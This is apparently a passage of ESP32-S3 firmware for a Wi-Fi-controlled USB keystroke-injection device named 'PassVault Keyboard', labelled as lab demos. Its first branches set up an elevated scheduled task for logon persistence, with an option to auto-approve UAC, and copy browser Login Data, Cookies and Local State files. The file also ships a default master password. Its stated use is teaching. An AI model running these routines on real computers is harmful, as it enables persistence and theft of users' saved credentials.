      else if (lab == "persistAdmin")
      {
        // Educational lab demo (T1053.005): creates a scheduled task that
        // runs at logon with highest privileges. Elevated via Ctrl+Shift+
        // Enter — the real UAC prompt appears and must be approved. No
        // bypass. Reversible with:
        //   schtasks /delete /tn LabPersistTask /f
        labRunWinR("persist-admin/create", LAB_PERSIST_ADMIN_CMD, true);
        delay(2000); // UAC handled (auto-Alt+Y when LAB_UAC_AUTOYES=1)
        labRunWinR("persist-admin/show", LAB_PERSIST_ADMIN_PROOF_CMD);
        LOG("[Lab] Persistence task 'LabPersistTask' created (admin)\n");
      }
      else if (lab == "browser")
      {
        // Educational lab demo (T1555.003): closes browsers to unlock the
        // SQLite stores, then copies Login Data / Cookies / Local State to
        // C:\LabOut\Browser. Collection only, nothing leaves the VM.
        labRunWinR("browser/chrome", LAB_BROWSER_CHROME_CMD);
        delay(1000);
        labRunWinR("browser/edge", LAB_BROWSER_EDGE_CMD);
        LOG("[Lab] Browser artifacts copied to C:\\LabOut\\Browser\n");
      }

      return;
    }

    // --- Web Keyboard: KB:D / KB:U / KB:R protocol ---
    if (length > 3 && payload[0] == 'K' && payload[1] == 'B' &&
        payload[2] == ':')
    {
      char cmd = payload[3];
      if (cmd == 'R')
      {
        releaseAllKeys();
      }
      else
      {
        int hid = 0, mod = 0;
        sscanf((const char *)payload + 5, "%d:%d", &hid, &mod);
        if (cmd == 'D')
        {
          kbd_report_t rpt = {};
          rpt.modifier = (uint8_t)mod;
          rpt.keycodes[0] = (uint8_t)hid;
          forwardReportToPC(rpt);
        }
        else if (cmd == 'U')
        {
          kbd_report_t rpt = {};
          rpt.modifier = (uint8_t)mod;
          forwardReportToPC(rpt);
        }
      }
    }
    break;
  }
  default:
    break;
  }
}

// =====================================================================
// Forward HID Report -> USB HID Keyboard to PC
// =====================================================================
static void forwardReportToPC(const kbd_report_t &report)
{
  KeyReport kr;
  kr.modifiers = report.modifier;
  kr.reserved = 0;
  memcpy(kr.keys, report.keycodes, 6);
  Keyboard.sendReport(&kr);
}

static void releaseAllKeys() { Keyboard.releaseAll(); }

// =====================================================================
// Wi-Fi AP Initialization
// =====================================================================
static void initWiFi()
{
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASSWORD, WIFI_CHANNEL, AP_HIDDEN, AP_MAX_CONNECTIONS);
  delay(500);

  wifi_config_t conf;
  esp_wifi_get_config(WIFI_IF_AP, &conf);
  conf.ap.authmode = WIFI_AUTH_WPA2_WPA3_PSK;
  esp_wifi_set_config(WIFI_IF_AP, &conf);

  LOG("[WiFi] AP Started — SSID: %s, Channel: %d, WPA2/WPA3\n", AP_SSID, WIFI_CHANNEL);
  LOG("[WiFi] IP: %s\n", WiFi.softAPIP().toString().c_str());
}

// =====================================================================
// Web Server + WebSocket Initialization
// =====================================================================
static void initWebServer()
{
  server.on("/", HTTP_GET,
            []()
            { server.send_P(200, "text/html", INDEX_HTML); });
  server.on("/edit", HTTP_GET, []()
            {
    String cfg = vaultPrefs.getString("uiconfig", "{}");
    String html = R"(<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Config</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#0a0e17;color:#e0e6ed;padding:16px}
h2{font-size:1.1em;margin-bottom:8px}p{font-size:.75em;color:#718096;margin-bottom:12px}
textarea{width:100%;min-height:220px;background:#111827;color:#63b3ed;border:1px solid rgba(99,179,237,.15);border-radius:9px;padding:12px;font-family:'Cascadia Code',monospace;font-size:14px;outline:none;resize:vertical}
textarea:focus{border-color:rgba(99,179,237,.45)}
button{margin-top:10px;width:100%;min-height:44px;background:rgba(99,179,237,.18);border:1px solid rgba(99,179,237,.3);border-radius:9px;color:#63b3ed;font-size:14px;font-weight:700;cursor:pointer}
#msg{margin-top:8px;font-size:.78em;min-height:20px}
a{color:#718096;font-size:.75em;display:block;margin-top:12px;text-align:center}</style></head>
<body><h2>Config editor</h2><p>Raw JSON — edit values, hit save. Frontend reloads config on next connect.</p>
<textarea id="cfg">)" + cfg + R"xx(</textarea>
<button onclick="save()">Save</button><div id="msg"></div><a href="/">Back to main</a>
<script>
function save(){var t=document.getElementById('cfg').value.trim();
try{JSON.parse(t)}catch(e){document.getElementById('msg').style.color='#fc8181';document.getElementById('msg').textContent='Invalid JSON: '+e.message;return;}
var ws=new WebSocket('ws://'+location.hostname+':81');
ws.onopen=function(){ws.send('CFG:SET:'+t);document.getElementById('msg').style.color='#68d391';document.getElementById('msg').textContent='Saved!';setTimeout(function(){ws.close()},500);};
ws.onerror=function(){document.getElementById('msg').style.color='#fc8181';document.getElementById('msg').textContent='Connection failed';};}
</script></body></html>)xx";
    server.send(200, "text/html", html); });
  server.begin();
  LOGLN("[WebServer] HTTP started on port 80");

  webSocket.begin();
  webSocket.onEvent(webSocketEvent);
  LOG("[WebServer] WebSocket started on port 81\n");
  LOG("[WebServer] Open: http://%s/\n",
      WiFi.softAPIP().toString().c_str());
}

// =====================================================================
// Setup
// =====================================================================
void setup()
{
  Serial.begin(115200);
  Serial0.begin(115200);
  delay(1000);

  LOGLN("========================================");
  LOGLN("  PassVault Keyboard — ESP32-S3");
  LOGLN("========================================");

  USB.begin();
  Keyboard.begin();
  Keyboard.onEvent(ARDUINO_USB_HID_KEYBOARD_LED_EVENT, keyboardLedCb);
  LOGLN("[USB HID] Keyboard device started");

  vaultDeriveKey();
  vaultPrefs.begin("vault", false);
  vaultMasterPass = vaultPrefs.getString("vaultpass", "passvault");
  vaultMasterFails = (uint8_t)vaultPrefs.getUInt("masterfails", 0);
  vaultLoad();
  quickActionsLoad();

  initWiFi();
  initWebServer();

  LOGLN("[Ready] PassVault active");
  LOGLN("========================================");
}

// =====================================================================
// Main Loop
// =====================================================================
void loop()
{
  server.handleClient();
  webSocket.loop();
  ldTick();
}
